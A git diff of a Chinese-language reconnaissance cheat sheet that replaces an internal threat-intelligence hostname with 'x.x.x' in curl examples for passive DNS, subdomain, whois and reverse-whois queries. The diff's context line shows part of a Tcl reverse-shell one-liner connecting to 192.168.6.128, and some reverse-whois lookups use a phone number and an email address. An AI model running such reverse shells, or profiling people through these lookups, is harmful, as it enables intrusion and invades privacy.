@@ -640,77 +640,77 @@ echo 'set s [socket 192.168.6.128 1234];while 42 { puts -nonewline $s "shell>";f
 
 - 查询二级域名
 
-	- curl http://fdp.qianxin-inc.cn/topdomain/sld/qq.com
-curl http://fdp.qianxin-inc.cn/topdomain/sld/rank/110
+	- curl http://x.x.x/topdomain/sld/qq.com
+curl http://x.x.x/topdomain/sld/rank/110
 
 - 查询全域名
 
-	- curl http://fdp.qianxin-inc.cn/topdomain/fqdn/www.baidu.com
-curl http://fdp.qianxin-inc.cn/topdomain/fqdn/rank/1
+	- curl http://x.x.x/topdomain/fqdn/www.baidu.com
+curl http://x.x.x/topdomain/fqdn/rank/1
 
 ### DNS流量
 
 - 查询指定域名的客户端访问IP
 
-	- curl "http://fdp.qianxin-inc.cn/pdns/access/domain/www.qianxin-inc.cn/?start=20170903155555&end=20170903170000"
+	- curl "http://x.x.x/pdns/access/domain/www.qianxin-inc.cn/?start=20170903155555&end=20170903170000"
 
 - 查询指定客户端IP访问的域名信息
 
-	- curl "http://fdp.qianxin-inc.cn/pdns/access/client/1.204.151.47/?start=20171201145555&end=20171203170000&limit=10"
+	- curl "http://x.x.x/pdns/access/client/1.204.151.47/?start=20171201145555&end=20171203170000&limit=10"
 
 ### 域名及其子域名
 
 - 查询指定域名的子域名及其出现时间
 
-	- curl "http://fdp.qianxin-inc.cn/dtree/pogzu3g64vj-y4en6.com/?timeformat=simple"
+	- curl "http://x.x.x/dtree/pogzu3g64vj-y4en6.com/?timeformat=simple"
 
 ### 域名与IP映射信息
 
 - 查询指定域名或前缀通配符域名的解析信息
 
-	- curl "http://fdp.qianxin-inc.cn/flint/rrset/*.baidu.com/?limit=10"
+	- curl "http://x.x.x/flint/rrset/*.baidu.com/?limit=10"
 
 - 查询指定域名或IP或后缀通配域名或IP的被解析信息
 
-	- curl "http://fdp.qianxin-inc.cn/flint/rdata/220.181.112.*/?limit=10"
+	- curl "http://x.x.x/flint/rdata/220.181.112.*/?limit=10"
 
 - 指定CIDR查询相关域名(CIDR>=24)
 
-	- curl http://beta.fdp.qianxin-inc.cn/flint/rdata/39.106.113.0/31/?slimit=1
+	- curl http://beta.x.x.x/flint/rdata/39.106.113.0/31/?slimit=1
 
 ### whois
 
 - 查询whois记录总数
 
-	- curl "http://fdp.qianxin-inc.cn/whois/count/baidu.com,google.com"
-curl "http://fdp.qianxin-inc.cn/whois/count/email/dns-admin@google.com"
+	- curl "http://x.x.x/whois/count/baidu.com,google.com"
+curl "http://x.x.x/whois/count/email/dns-admin@google.com"
 可选：domain、nameserver、email、phone、org、name
 
 - 查询指定域名的whois详细信息
 
-	- curl "http://fdp.qianxin-inc.cn/whois/detail/google.com"
+	- curl "http://x.x.x/whois/detail/google.com"
 
 - 查询指定域名的whois历史记录
 
-	- curl "http://fdp.qianxin-inc.cn/whois/history/google.com/?order=1"
+	- curl "http://x.x.x/whois/history/google.com/?order=1"
 
 - 根据姓名/电话/email/机构名等信息反查相关域名
 
-	- curl "http://fdp.qianxin-inc.cn/whois/reverse/shujun/?limit=10"
-curl "http://fdp.qianxin-inc.cn/whois/reverse/name/shujun"
-curl "http://fdp.qianxin-inc.cn/whois/reverse/phone/+86.13511629585"
-curl "http://fdp.qianxin-inc.cn/whois/reverse/email/373192510@qq.com/?limit=10"
-curl "http://fdp.qianxin-inc.cn/whois/reverse/org/shujun/?limit=5&skip=5"
-curl "http://fdp.qianxin-inc.cn/whois/reverse/nameserver/dns.hichina.com"
+	- curl "http://x.x.x/whois/reverse/shujun/?limit=10"
+curl "http://x.x.x/whois/reverse/name/shujun"
+curl "http://x.x.x/whois/reverse/phone/+86.13511629585"
+curl "http://x.x.x/whois/reverse/email/373192510@qq.com/?limit=10"
+curl "http://x.x.x/whois/reverse/org/shujun/?limit=5&skip=5"
+curl "http://x.x.x/whois/reverse/nameserver/dns.hichina.com"
 
 ### 域名请求趋势
 
-- curl http://fdp.qianxin-inc.cn/trends/www.baidu.com?type=fqdn&start=20200301&end=20200305
+- curl http://x.x.x/trends/www.baidu.com?type=fqdn&start=20200301&end=20200305
 
 ### 根据ICP备案号查询相关ICP数据
 
-- curl http://beta.fdp.qianxin-inc.cn/icp/%E6%B5%99B2-20080224-1
-curl http://beta.fdp.qianxin-inc.cn/icp/domain/taobao.com
+- curl http://beta.x.x.x/icp/%E6%B5%99B2-20080224-1
+curl http://beta.x.x.x/icp/domain/taobao.com
 支持(domain,icp,webname,owner)
 
 ## 路由交换默认密码查询
